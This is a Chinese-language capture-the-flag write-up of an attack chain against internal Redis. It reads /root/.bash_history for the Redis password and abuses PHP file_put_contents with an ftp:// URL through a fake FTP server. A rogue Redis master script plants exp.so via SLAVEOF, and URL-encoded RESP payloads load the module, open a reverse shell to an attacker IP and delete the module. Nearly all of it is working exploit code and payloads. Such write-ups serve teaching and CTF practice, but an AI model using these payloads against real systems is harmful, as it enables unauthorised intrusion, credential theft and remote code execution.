这道题目考察利用ftp攻击内网redis来进行主从复制攻击以达到反弹shell的效果

首先file_get_contents读取/root/.bash_history发现redis地址和密码

其次利用file_put_contents函数来攻击内网redis

1. 在公网启动伪造的ftp服务
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (172,30,0,3,0,6379)\n') #STOR esay_eval
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

2. file_put_contents发送给ftp服务器并转发到内网的redis服务中，设置主从机
```
put=ftp://xx.xxx.xxx.xxx:8888/dfsaf&content=%2A2%0D%0A%244%0D%0AAUTH%0D%0A%2420%0D%0Ay0u_c4n_not_gue55_1t%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2413%0D%0Axx.xxx.xxx.xx%0D%0A%244%0D%0A9999%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0ADIR%0D%0A%244%0D%0A/tmp%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0ADBFILENAME%0D%0A%246%0D%0Aexp.so%0D%0A
```

3. 公网服务器启动伪造的redis服务来发送exp.so
```python
import socket
import sys
import struct
from time import sleep
import re

payload = open('exp.so', 'rb').read()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
s.bind(('0.0.0.0', 9999))
s.listen(5)
conn, addr = s.accept()
print(addr)

CLRF = '\r\n'

def dout(sock, msg):
    verbose = 1
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if sys.version_info < (3, 0):
            msg = repr(msg)
        if len(msg) < 300:
            print("\033[1;32;40m[<-]\033[0m {}".format(msg))
        else:
            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))


def handle(data):
    resp = ""
    phase = 0
    if data.find("PING") > -1:
        resp = "+PONG" + CLRF
        phase = 1
    elif data.find("REPLCONF") > -1:
        resp = "+OK" + CLRF
        phase = 2
    elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
        resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
        resp += "$" + str(len(payload)) + CLRF
        resp = resp.encode()
        resp += payload + CLRF.encode()
        phase = 3
    return resp, phase


def din(sock, cnt):
    msg = sock.recv(cnt)
    verbose = 1
    if verbose:
        if len(msg) < 300:
            print("\033[1;34;40m[->]\033[0m {}".format(msg))
        else:
            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    if sys.version_info < (3, 0):
        res = re.sub(r'[^\x00-\x7f]', r'', msg)
    else:
        res = re.sub(b'[^\x00-\x7f]', b'', msg)
    return res.decode()


def exp():
    try:
        cli = conn
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = handle(data)
            dout(cli, resp)
            sleep(3)
            if phase == 3:
                break
    except Exception as e:
        print("\033[1;31;m[-]\033[0m Error: {}, exit".format(e))
        #cleanup(self._remote, self._file)
        exit(0)
    except KeyboardInterrupt:
        print("[-] Exit..")
        exit(0)

exp()
```

4. 加载exp.so
```
%2A2%0D%0A%244%0D%0AAUTH%0D%0A%2420%0D%0Ay0u_c4n_not_gue55_1t%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%242%0D%0ANO%0D%0A%243%0D%0AONT%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
```

5. 反弹shell并删除exp.so

```
%2A2%0D%0A%244%0D%0AAUTH%0D%0A%2420%0D%0Ay0u_c4n_not_gue55_1t%0D%0A%2A3%0D%0A%2410%0D%0Asystem.rev%0D%0A%2413%0D%0Axx.xxx.xxx.xx%0D%0A%245%0D%0A12334%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%248%0D%0Adump.rdb%0D%0A%2A3%0D%0A%2411%0D%0Asystem.exec%0D%0A%242%0D%0Arm%0D%0A%248%0D%0A./exp.so%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%246%0D%0AUNLOAD%0D%0A%246%0D%0Asystem%0D%0A
```